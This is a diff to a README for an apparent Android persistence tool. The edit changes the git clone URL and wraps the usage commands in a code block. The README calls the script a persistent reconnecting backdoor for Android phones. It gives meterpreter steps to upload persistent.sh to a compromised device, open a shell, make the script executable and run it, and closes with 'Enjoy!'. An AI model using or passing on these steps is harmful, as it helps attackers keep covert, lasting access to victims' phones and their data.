@@ -2,7 +2,7 @@
 
 ## Installation
 ```
-git clone https://github.com/derosploit/android-persistant.sh/
+git clone https://github.com/derickmachaa/android-persistant.sh/
 ```
 ## Description
 This scripts creates a persistent reconnecting backdoor on android phones  
@@ -17,10 +17,12 @@ a running meterpreter session on target device
 upload the script in the device,execute and enjoy
 
 Assume this is our meterpreter session  
+```bash
 meterpreter> upload persistent.sh  
 meterpreter> shell   
 chmod 755 persistent.sh  
 ./persistent.sh  
+```
 
 ##Enjoy!
 
